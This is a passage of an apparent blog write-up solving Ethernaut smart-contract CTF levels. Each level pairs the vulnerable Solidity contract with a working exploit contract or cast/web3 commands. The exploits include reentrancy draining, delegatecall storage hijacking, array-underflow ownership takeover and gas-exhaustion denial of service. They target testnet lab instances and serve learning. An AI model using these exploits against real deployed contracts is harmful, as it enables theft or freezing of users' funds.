+</span><span>    constructor (address payable _address) public payable {
+</span><span>        _reentrance = Reentrance(_address);
+</span><span>    }
+</span><span>
+</span><span>    function attack () public payable {
+</span><span>        address(_reentrance).call{value: 100000000000000}(abi.encodeWithSelector(bytes4(keccak256("donate(address)")), address(this)));
+</span><span>        _reentrance.withdraw(100000000000000);
+</span><span>    }
+</span><span>    receive () external payable {
+</span><span>        if(address(_reentrance).balance > 0) _reentrance.withdraw(100000000000000);
+</span><span>    }
+</span><span>}
+</span></code></pre><p>A word after solving the challenge.<blockquote><p><code>transfer</code> and <code>send</code> are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork <a href=https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/>Source 1</a> <a href=https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742>Source 2</a>.</blockquote><h2 id=elevator>Elevator</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>interface Building {
+</span><span>  function isLastFloor(uint) external returns (bool);
+</span><span>}
+</span><span>
+</span><span>
+</span><span>contract Elevator {
+</span><span>  bool public top;
+</span><span>  uint public floor;
+</span><span>
+</span><span>  function goTo(uint _floor) public {
+</span><span>    Building building = Building(msg.sender);
+</span><span>
+</span><span>    if (! building.isLastFloor(_floor)) {
+</span><span>      floor = _floor;
+</span><span>      top = building.isLastFloor(floor);
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Contract defined a interface <code>Building</code> and will be Instantiated when <code>goTo</code> function is called.<p>Thats mean <code>msg.sender</code> should be CA, with <code>goTo</code> function meet the interface requirements. And to exploit it we should let <code>isLastFloor</code> return false at first, and true at second time.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import './Elevator.sol';
+</span><span>
+</span><span>contract Hack {
+</span><span>  constructor(address _instance) {
+</span><span>    target = Elevator(_instance);
+</span><span>  }
+</span><span>  Elevator public target;
+</span><span>  bool result = true;
+</span><span>  function isLastFloor(uint) public returns (bool){
+</span><span>    if(result == true)
+</span><span>    {
+</span><span>      result = false;
+</span><span>    }
+</span><span>    else {
+</span><span>      result = true;
+</span><span>    }
+</span><span>    return result;
+</span><span>  }
+</span><span>
+</span><span>  function attack() public {
+</span><span>    target.goTo(10);
+</span><span>  }
+</span><span>}
+</span></code></pre><h2 id=privacy>Privacy</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Privacy {
+</span><span>
+</span><span>  bool public locked = true;
+</span><span>  uint256 public ID = block.timestamp;
+</span><span>  uint8 private flattening = 10;
+</span><span>  uint8 private denomination = 255;
+</span><span>  uint16 private awkwardness = uint16(block.timestamp);
+</span><span>  bytes32[3] private data;
+</span><span>
+</span><span>  constructor(bytes32[3] memory _data) {
+</span><span>    data = _data;
+</span><span>  }
+</span><span>  
+</span><span>  function unlock(bytes16 _key) public {
+</span><span>    require(_key == bytes16(data[2]));
+</span><span>    locked = false;
+</span><span>  }
+</span><span>
+</span><span>  /*
+</span><span>    A bunch of super advanced solidity algorithms...
+</span><span>
+</span><span>      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+</span><span>      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+</span><span>      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+</span><span>      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+</span><span>      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+</span><span>  */
+</span><span>}
+</span></code></pre><p>Still, there is not real “private” variable in ethereum. Even the memory of contract could be view by given API of web3.js.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>> (await web3.eth.getStorageAt(contract.address, 5))
+</span><span>< '0x1603c85b3f007519d352444d1eee059b52fbf7c375579129a1903cead8e3ca82'
+</span></code></pre><pre class=language-bash data-lang=bash style=background:#2e3440;color:#d8dee9><code class=language-bash data-lang=bash><span style=color:#88c0d0>$</span><span> cast call 0x34a17DfF1f3CCde4d2948c58658993D9F0320050 </span><span style=color:#a3be8c>"unlock(bytes16)"</span><span> -r wss://ethereum-sepolia.publicnode.com --private-key </span><span style=color:#81a1c1><</span><span>REDACTED</span><span style=color:#81a1c1>> </span><span style=color:#eceff4>-</span><span>- 0x1603c85b3f007519d352444d1eee059b -f
+</span><span style=color:#88c0d0>0x
+</span></code></pre><p><del>I didn’t know why it output <code>0x</code>. but it actually be worked.（x</del><h2 id=gatekeeper-one>Gatekeeper One</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract GatekeeperOne {
+</span><span>
+</span><span>  address public entrant;
+</span><span>
+</span><span>  modifier gateOne() {
+</span><span>    require(msg.sender != tx.origin);
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  modifier gateTwo() {
+</span><span>    require(gasleft() % 8191 == 0);
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  modifier gateThree(bytes8 _gateKey) {
+</span><span>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+</span><span>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+</span><span>      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+</span><span>    entrant = tx.origin;
+</span><span>    return true;
+</span><span>  }
+</span><span>}
+</span></code></pre><p>This challenge need us to pass three check of modifier.<ul><li>gateOne: just the previous challenge <code>Telephone</code><li>gateTwo: gas remaining required to be an integer multiple of 10. Brute force with some meaningless code could pass this.<li>gateThree: three requirements to <code>_gateKey</code> param: <ul><li><p><code>_gateKey[4:7]</code> == <code>_gateKey[6:7]</code> (<code>_gate[4:5]</code> == <code>0x0000</code>)</p><li><p><code>_gateKey[4:7]</code> != <code>_gateKey[0:7]</code>(<code>_gateKey[0:3]</code> != <code>0x00000000</code>)</p><li><p><code>_gateKey[4:7]</code> == <code>tx.origin[28:29]</code>(<code>_gateKey[4:5]</code>== <code>0x0000</code> && <code>_gateKey[6:7]</code> == <code>tx.origin[28:29]</code>)</p></ul></ul><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.6.0;
+</span><span>
+</span><span>import "./chall/GatekeeperOne.sol";
+</span><span>
+</span><span>contract exp {
+</span><span>
+</span><span>    GatekeeperOne level13 = GatekeeperOne(0xF4F13D94A1c5A8e51DED1692171bC67260289E5E);
+</span><span>
+</span><span>    function exploit() external{
+</span><span>        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
+</span><span>        for (uint256 i = 0; i < 300; i++) {
+</span><span>            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+</span><span>            if (success) {
+</span><span>                break;
+</span><span>            }
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span></code></pre><p><em>solidity changes so fast… only found 0.6.3 could compile this(with <code>Explicit type conversion</code> and <code>lower level call{}()</code> )</em><h2 id=gatekeeper-two>GateKeeper Two</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract GatekeeperTwo {
+</span><span>
+</span><span>  address public entrant;
+</span><span>
+</span><span>  modifier gateOne() {
+</span><span>    require(msg.sender != tx.origin);
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  modifier gateTwo() {
+</span><span>    uint x;
+</span><span>    assembly { x := extcodesize(caller()) }
+</span><span>    require(x == 0);
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  modifier gateThree(bytes8 _gateKey) {
+</span><span>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+</span><span>    entrant = tx.origin;
+</span><span>    return true;
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Still three modifier:<ul><li>gateOne: same with the former challenge<li>gateTwo: caller’s code size should be 0, and will be satisfied if calling in constructor.<li>gateTree: <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)</code>, equivalent to <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) == uint64(_gateKey)</code> and can be calculated in this way.</ul><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import "./chall/GateKeeperTwo.sol";
+</span><span>
+</span><span>contract exp {
+</span><span>    address Instance;
+</span><span>    
+</span><span>    constructor(address _addr) {
+</span><span>      Instance = _addr;
+</span><span>      unchecked{
+</span><span>          bytes8 key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max  );
+</span><span>          GatekeeperTwo(Instance).enter(key);
+</span><span>      }
+</span><span>    }
+</span><span>}
+</span></code></pre><h2 id=naught-coin>naught coin</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
+</span><span>
+</span><span> contract NaughtCoin is ERC20 {
+</span><span>
+</span><span>  // string public constant name = 'NaughtCoin';
+</span><span>  // string public constant symbol = '0x0';
+</span><span>  // uint public constant decimals = 18;
+</span><span>  uint public timeLock = block.timestamp + 10 * 365 days;
+</span><span>  uint256 public INITIAL_SUPPLY;
+</span><span>  address public player;
+</span><span>
+</span><span>  constructor(address _player) 
+</span><span>  ERC20('NaughtCoin', '0x0') {
+</span><span>    player = _player;
+</span><span>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
+</span><span>    // _totalSupply = INITIAL_SUPPLY;
+</span><span>    // _balances[player] = INITIAL_SUPPLY;
+</span><span>    _mint(player, INITIAL_SUPPLY);
+</span><span>    emit Transfer(address(0), player, INITIAL_SUPPLY);
+</span><span>  }
+</span><span>  
+</span><span>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
+</span><span>    super.transfer(_to, _value);
+</span><span>  }
+</span><span>
+</span><span>  // Prevent the initial owner from transferring tokens until the timelock has passed
+</span><span>  modifier lockTokens() {
+</span><span>    if (msg.sender == player) {
+</span><span>      require(block.timestamp > timeLock);
+</span><span>      _;
+</span><span>    } else {
+</span><span>     _;
+</span><span>    }
+</span><span>  } 
+</span><span>} 
+</span></code></pre><p>This contract is inherited from <a href=https://docs.openzeppelin.com/contracts/3.x/api/token/erc20>ERC20</a> and overrided the function <code>transfer</code>.<p>Just have a view of official documents will find the function <code>approval</code> and <code>transferFrom</code>, which is exploitable.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>contract.approve(player,toWei("1000000"))
+</span><span>contract.transferFrom(player,contract.address,toWei("1000000"))
+</span></code></pre><h2 id=preservation>Preservation</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Preservation {
+</span><span>
+</span><span>  // public library contracts 
+</span><span>  address public timeZone1Library;
+</span><span>  address public timeZone2Library;
+</span><span>  address public owner; 
+</span><span>  uint storedTime;
+</span><span>  // Sets the function signature for delegatecall
+</span><span>  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+</span><span>
+</span><span>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+</span><span>    timeZone1Library = _timeZone1LibraryAddress; 
+</span><span>    timeZone2Library = _timeZone2LibraryAddress; 
+</span><span>    owner = msg.sender;
+</span><span>  }
+</span><span> 
+</span><span>  // set the time for timezone 1
+</span><span>  function setFirstTime(uint _timeStamp) public {
+</span><span>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+</span><span>  }
+</span><span>
+</span><span>  // set the time for timezone 2
+</span><span>  function setSecondTime(uint _timeStamp) public {
+</span><span>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span>// Simple library contract to set the time
+</span><span>contract LibraryContract {
+</span><span>
+</span><span>  // stores a timestamp 
+</span><span>  uint storedTime;  
+</span><span>
+</span><span>  function setTime(uint _time) public {
+</span><span>    storedTime = _time;
+</span><span>  }
+</span><span>}
+</span></code></pre><p>https://learnblockchain.cn/article/5372: <code>delegateCall</code> stating variables are actually modified not by their names, but by their declared location in storage.<p>That is mean when delegateCall LibraryContract, <code>storedTime</code> was pointed to the address of <code>timeZone1Library</code> in Preservation’s storage. Through that, we can change the timeZone1Library to our evil contract, and call <code>setFirstTime</code> again to trigger evil code.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract exp {
+</span><span>
+</span><span>  // stores a timestamp 
+</span><span>  uint holder1;
+</span><span>  uint holder2;
+</span><span>  address owner;
+</span><span>
+</span><span>  function setTime(uint _time) public {
+</span><span>    holder1 = _time;
+</span><span>    owner = address(0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9);
+</span><span>  }
+</span><span>}
+</span></code></pre><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>> contract.setFirstTime('0x12e47be67263aF5939fe689A549c3e2a9110417F') //deployed exp contract address
+</span><span>> await web3.eth.getStorageAt(contract.address, 0)
+</span><span>< '0x00000000000000000000000012e47be67263af5939fe689a549c3e2a9110417f'
+</span><span>> contract.setFirstTime('0x12e47be67263aF5939fe689A549c3e2a9110417F') //simply could be anything valid
+</span></code></pre><h2 id=recovery>Recovery</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Recovery {
+</span><span>
+</span><span>  //generate tokens
+</span><span>  function generateToken(string memory _name, uint256 _initialSupply) public {
+</span><span>    new SimpleToken(_name, msg.sender, _initialSupply);
+</span><span>  
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span>contract SimpleToken {
+</span><span>
+</span><span>  string public name;
+</span><span>  mapping (address => uint) public balances;
+</span><span>
+</span><span>  // constructor
+</span><span>  constructor(string memory _name, address _creator, uint256 _initialSupply) {
+</span><span>    name = _name;
+</span><span>    balances[_creator] = _initialSupply;
+</span><span>  }
+</span><span>
+</span><span>  // collect ether in return for tokens
+</span><span>  receive() external payable {
+</span><span>    balances[msg.sender] = msg.value * 10;
+</span><span>  }
+</span><span>
+</span><span>  // allow transfers of tokens
+</span><span>  function transfer(address _to, uint _amount) public { 
+</span><span>    require(balances[msg.sender] >= _amount);
+</span><span>    balances[msg.sender] = balances[msg.sender] - _amount;
+</span><span>    balances[_to] = _amount;
+</span><span>  }
+</span><span>
+</span><span>  // clean up after ourselves
+</span><span>  function destroy(address payable _to) public {
+</span><span>    selfdestruct(_to);
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Tracking the contract creation(Internal transcation) on etherscan would show the address of created token contract. Any note that <code>destroy</code> function was setted to be public, call this function could solve this challenge<pre class=language-bash data-lang=bash style=background:#2e3440;color:#d8dee9><code class=language-bash data-lang=bash><span style=color:#88c0d0>$</span><span> cast send 0xe8b72c8696d6370bc1b0ba465477c3c3c650cde0 </span><span style=color:#a3be8c>"destroy(address)"</span><span> -r </span><span style=color:#a3be8c>"https://1rpc.io/sepolia"</span><span> --private-key </span><span style=color:#81a1c1><</span><span style=color:#b48ead>64</span><span>bytesKey</span><span style=color:#81a1c1>> </span><span style=color:#eceff4>-</span><span>- </span><span style=color:#a3be8c>'0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
+</span></code></pre><blockquote><p>Contract addresses are deterministic and are calculated by <code>keccak256(address, nonce)</code> where the <code>address</code> is the address of the contract (or ethereum address that created the transaction) and <code>nonce</code> is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).<p>Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.<p>An interesting <a href=https://swende.se/blog/Ethereum_quirks_and_vulns.html>blog post</a> by Martin Swende details potential use cases of this.<p>If you’re going to implement this technique, make sure you don’t miss the nonce, or your funds will be lost forever.</blockquote><p>seems not intended… but the blog interesting exactly.<h2 id=magicnumber>MagicNumber</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract MagicNum {
+</span><span>
+</span><span>  address public solver;
+</span><span>
+</span><span>  constructor() {}
+</span><span>
+</span><span>  function setSolver(address _solver) public {
+</span><span>    solver = _solver;
+</span><span>  }
+</span><span>
+</span><span>  /*
+</span><span>    ____________/\\\_______/\\\\\\\\\_____        
+</span><span>     __________/\\\\\_____/\\\///////\\\___       
+</span><span>      ________/\\\/\\\____\///______\//\\\__      
+</span><span>       ______/\\\/\/\\\______________/\\\/___     
+</span><span>        ____/\\\/__\/\\\___________/\\\//_____    
+</span><span>         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+</span><span>          _\///////////\\\//____/\\\/___________  
+</span><span>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+</span><span>            ___________\///_____\///////////////__
+</span><span>  */
+</span><span>}
+</span></code></pre><blockquote><p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.<p>Easy right? Well… there’s a catch.<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.<p>Good luck!</blockquote><p>write valid opcodes to implement the contract like following: (I found it on the internet somewhere)<ol><li><p>0x60 - PUSH1 –> PUSH(0x2a) –> 0x602a (Pushing 2a or 42)</p><li><p>0x60 - PUSH1 –> PUSH(0x80) –> 0x6080 (Pushing an arbitrary selected memory slot 80)</p><li><p>0x52 - MSTORE –> MSTORE –> 0x52 (Store value p=0x2a at position v=0x80 in memory)</p><li><p>0x60 - PUSH1 –> PUSH(0x20) –> 0x6020 (Size of value is 32 bytes)</p><li><p>0x60 - PUSH1 –> PUSH(0x80) –> 0x6080 (Value was stored in slot 0x80)</p><li><p>0xf3 - RETURN –> RETURN –> 0xf3 (Return value at p=0x80 slot and of size s=0x20)</p></ol><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// deploy it and get contractAddress
+</span><span>await web3.eth.sendTransaction({ from:player, data: '0x69602a60005260206000f3600052600a6016f3' });
+</span><span>// submit the solver contract
+</span><span>await contract.setSolver('0x5ba95745bb7ae5ac15ab9968e665ab761ca7b62f')
+</span></code></pre><h2 id=alien-codex>Alien Codex</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.5.0;
+</span><span>
+</span><span>import '../helpers/Ownable-05.sol';
+</span><span>
+</span><span>contract AlienCodex is Ownable {
+</span><span>
+</span><span>  bool public contact;
+</span><span>  bytes32[] public codex;
+</span><span>
+</span><span>  modifier contacted() {
+</span><span>    assert(contact);
+</span><span>    _;
+</span><span>  }
+</span><span>  
+</span><span>  function makeContact() public {
+</span><span>    contact = true;
+</span><span>  }
+</span><span>
+</span><span>  function record(bytes32 _content) contacted public {
+</span><span>    codex.push(_content);
+</span><span>  }
+</span><span>
+</span><span>  function retract() contacted public {
+</span><span>    codex.length--;
+</span><span>  }
+</span><span>
+</span><span>  function revise(uint i, bytes32 _content) contacted public {
+</span><span>    codex[i] = _content;
+</span><span>  }
+</span><span>}
+</span></code></pre><p>When array declared, it will occupy a slot in memory like other type do as its length, and set a base address for the data area by following formula:<pre style=background:#2e3440;color:#d8dee9><code><span>keccak(slot)
+</span></code></pre><p>and the data will be store like:<pre style=background:#2e3440;color:#d8dee9><code><span>codex[0] => (keccak(slot) + 0) % 2 ** 256
+</span><span>codex[1] => (keccak(slot) + 1) % 2 ** 256
+</span><span>...
+</span><span>codex[i] => (keccak(slot) + i) % 2 ** 256
+</span></code></pre><p>thus we can override the data of owner to claim ownership.<pre style=background:#2e3440;color:#d8dee9><code><span>&codex[i] == &owner
+</span><span>=> (keccak(length_slot) + i) % 2 ** 256 == 0
+</span><span>=> (keccak(length_slot) + i) == 2 ** 256
+</span><span>=> i == 2 ** 256 - keccak(length_slot)
+</span><span>+ length_slot = 1
+</span><span>=> i == 2 ** 256 - keccak(1)
+</span></code></pre><p>In addition, it should be noted that the array value will be determined according to the length range, so it is necessary to cause the length variable to underflow first.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>interface IAlienCodex {
+</span><span>    function makeContact() external;
+</span><span>    function retract() external;
+</span><span>    function revise(uint i, bytes32 _content) external;
+</span><span>}
+</span><span>
+</span><span>contract exp {
+</span><span>    IAlienCodex Instance;
+</span><span>
+</span><span>    constructor(address _addr) {
+</span><span>      Instance = IAlienCodex(_addr);
+</span><span>    }
+</span><span>
+</span><span>    function attack() public {
+</span><span>        unchecked{
+</span><span>            Instance.makeContact();
+</span><span>            Instance.retract();
+</span><span>            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
+</span><span>            Instance.revise(index, bytes32(uint256(uint160(tx.origin))));
+</span><span>        }
+</span><span>    }
+</span><span>
+</span><span>}
+</span></code></pre><h2 id=denial>Denial</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>contract Denial {
+</span><span>
+</span><span>    address public partner; // withdrawal partner - pay the gas, split the withdraw
+</span><span>    address public constant owner = address(0xA9E);
+</span><span>    uint timeLastWithdrawn;
+</span><span>    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+</span><span>
+</span><span>    function setWithdrawPartner(address _partner) public {
+</span><span>        partner = _partner;
+</span><span>    }
+</span><span>
+</span><span>    // withdraw 1% to recipient and 1% to owner
+</span><span>    function withdraw() public {
+</span><span>        uint amountToSend = address(this).balance / 100;
+</span><span>        // perform a call without checking return
+</span><span>        // The recipient can revert, the owner will still get their share
+</span><span>        partner.call{value:amountToSend}("");
+</span><span>        payable(owner).transfer(amountToSend);
+</span><span>        // keep track of last withdrawal time
+</span><span>        timeLastWithdrawn = block.timestamp;
+</span><span>        withdrawPartnerBalances[partner] +=  amountToSend;
+</span><span>    }
+</span><span>
+</span><span>    // allow deposit of funds
+</span><span>    receive() external payable {}
+</span><span>
+</span><span>    // convenience function
+</span><span>    function contractBalance() public view returns (uint) {
+</span><span>        return address(this).balance;
+</span><span>    }
+</span><span>}
+</span></code></pre><p>To complete this level, we need prevent the owner from withdrawing funds when they call <code>withdraw()</code>. that’s mean we should revert the tx in <code>withdraw</code> function calling process. After trying it, I found that contracts without payable will not cause revert. But we can cause gas exhaustion through an infinite loop, thus preventing the transaction from continuing.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract exp{
+</span><span>    fallback () payable external {
+</span><span>        while(true){}
+</span><span>    }
+</span><span>}
+</span></code></pre><blockquote><p>This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.<p>If you are using a low level <code>call</code> to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example <code>call.gas(100000).value()</code>.<p>Typically one should follow the <a href=http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern>checks-effects-interactions</a> pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.<p><em>Note</em>: An external <code>CALL</code> can use at most 63/64 of the gas currently available at the time of the <code>CALL</code>. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.</blockquote><h2 id=shop>shop</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>interface Buyer {
+</span><span>  function price() external view returns (uint);
+</span><span>}
+</span><span>
+</span><span>contract Shop {
+</span><span>  uint public price = 100;
+</span><span>  bool public isSold;
+</span><span>
+</span><span>  function buy() public {
+</span><span>    Buyer _buyer = Buyer(msg.sender);
+</span><span>
+</span><span>    if (_buyer.price() >= price && !isSold) {
+</span><span>      isSold = true;
+</span><span>      price = _buyer.price();
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Just like the previous level <a href=/blog/ethernaut/#Elevator>Elevator</a>. but at this time the interface was set to <code>view</code>, which means couldn’t change the state of contract like we do at Elevator.<p>but we could re-call the shop contract to construct two diffenrent returns value. (since the isSold variable was set to be public, its easy to do that)<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8;
+</span><span>
+</span><span>import "./chall/Shop.sol";
+</span><span>
+</span><span>contract exp {
+</span><span>    Shop levelInstance;
+</span><span>
+</span><span>    constructor(address addr) {
+</span><span>        levelInstance = Shop(addr);
+</span><span>    }
+</span><span>
+</span><span>    function price() public view returns (uint256) {
+</span><span>        return Shop(msg.sender).isSold() ? 0 : 100;
+</span><span>    }
+</span><span>
+</span><span>    function buy() public {
+</span><span>        levelInstance.buy();
+</span><span>    }
+</span><span>}
+</span></code></pre><p>and I have to say that even the <code>staticcall</code> could not prevent this. staticcall prevents many bytecode instructions from being called, but even within the contract there is still state changing. Related challenges: MetaTrust CTF 2023: <a href=https://ranwen.de/posts/2023-09-17-metatrust23/#who>Who(stage1)</a>.<h2 id=dex>Dex</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
+</span><span>import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+</span><span>import 'openzeppelin-contracts-08/access/Ownable.sol';
+</span><span>
+</span><span>contract Dex is Ownable {
+</span><span>  address public token1;
+</span><span>  address public token2;
+</span><span>  constructor() {}
+</span><span>
+</span><span>  function setTokens(address _token1, address _token2) public onlyOwner {
+</span><span>    token1 = _token1;
+</span><span>    token2 = _token2;
+</span><span>  }
+</span><span>  
+</span><span>  function addLiquidity(address token_address, uint amount) public onlyOwner {
+</span><span>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+</span><span>  }
+</span><span>  
+</span><span>  function swap(address from, address to, uint amount) public {
+</span><span>    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+</span><span>    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+</span><span>    uint swapAmount = getSwapPrice(from, to, amount);
+</span><span>    IERC20(from).transferFrom(msg.sender, address(this), amount);
+</span><span>    IERC20(to).approve(address(this), swapAmount);
+</span><span>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+</span><span>  }
+</span><span>
+</span><span>  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+</span><span>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+</span><span>  }
+</span><span>
+</span><span>  function approve(address spender, uint amount) public {
